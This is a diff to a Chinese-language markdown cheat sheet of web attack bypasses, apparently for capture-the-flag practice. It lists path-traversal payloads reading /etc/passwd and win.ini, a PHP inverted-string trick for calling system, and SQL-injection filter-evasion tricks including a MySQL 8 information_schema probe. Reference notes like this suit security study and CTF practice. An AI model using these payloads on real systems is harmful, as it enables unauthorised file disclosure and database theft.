@@ -22,6 +22,8 @@
 | 加入+         | ?filename=.+./.+./bin/redacted.dll                     |
 | %00           | ?filename=.%00./file.php <br>/etc/passwd%00.jpg        |
 | \             | ?filename=..%5c..%5c/windows/win.ini                   |
+| is_numeric    | is_numeric ('0xFFFF') 16 进制绕过                      |
+| 反码绕        | urlencode(~'system');                                  |
 
 ## bypass functions
 
@@ -118,16 +120,16 @@ copy /b 1.jpg+2.jpg 3 /y
 
 - 猜 列为 flag, 表为 flag , select flag from flag
 
-| bypass     |                                            |                                                                                                                                            |
-| ---------- | ------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------ |
-| 大小写     |                                            |                                                                                                                                            |
-| =          | like/regexp                                | 或用 !<>                                                                                                                                   |
-| 空格       | /\*\*/ 或 +                                | php 可用 %09、%0A、 %0B、 %0C、 %0D、%A0、%20 <br>and/or 后面可以跟上偶数个!、~可以替代空格 <br>and/or 前的空格可用省略. <br>'后空格可省略 |
-| select     | [handler](#handler)/updatexml/extractvalue |                                                                                                                                            |
-| 16 进制    | hex 自动转字符                             | 0x61 即 a                                                                                                                                  |
-| 1000       | 0x38e<br>`992\|8`<br>--1000<br>~~1000<br>200^800               |
-| **Mysql8** |                                            |
-| select     | [table](#sqltable)                         | table myuser == select \* from myuser                                                                                                      |
+| bypass     |                                                  |                                                                                                                                            |
+| ---------- | ------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------ |
+| 大小写     |                                                  |                                                                                                                                            |
+| =          | like/rlike/regexp                                | 或用 !<> , rlike 支持正则                                                                                                                  |
+| 空格       | /\*\*/ 或 +                                      | php 可用 %09、%0A、 %0B、 %0C、 %0D、%A0、%20 <br>and/or 后面可以跟上偶数个!、~可以替代空格 <br>and/or 前的空格可用省略. <br>'后空格可省略 |
+| select     | [handler](#handler)/updatexml/extractvalue       |                                                                                                                                            |
+| 16 进制    | hex 自动转字符                                   | 0x61 即 a                                                                                                                                  |
+| 1000       | 0x38e<br>`992\|8`<br>--1000<br>~~1000<br>200^800 |
+| **Mysql8** |                                                  |
+| select     | [table](#sqltable)                               | table myuser == select \* from myuser                                                                                                      |
 
 ## Test Regex
 
@@ -160,11 +162,12 @@ handler yunensec close;
 
 ## sql/table
 
-[for mysql8](https://mp.weixin.qq.com/s/U65QGzQoR1EY0QFaTy5--g) -- Web_sql_一篇文章弄懂mysql8新特性注入.html
+[for mysql8](https://mp.weixin.qq.com/s/U65QGzQoR1EY0QFaTy5--g) -- Web*sql*一篇文章弄懂 mysql8 新特性注入.html
 
 1.TABLE 始终显示表的所有列 2.TABLE 不允许对行进行任意过滤，即 TABLE 不支持任何 WHERE 子句
 
 ```sh
+(TABLE information_schema.tables ORDER BY TABLE_SCHEMA LIMIT 1 OFFSET 0)>(1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)
 table user order by 2
 table user limit 2
 table user limit 0,1
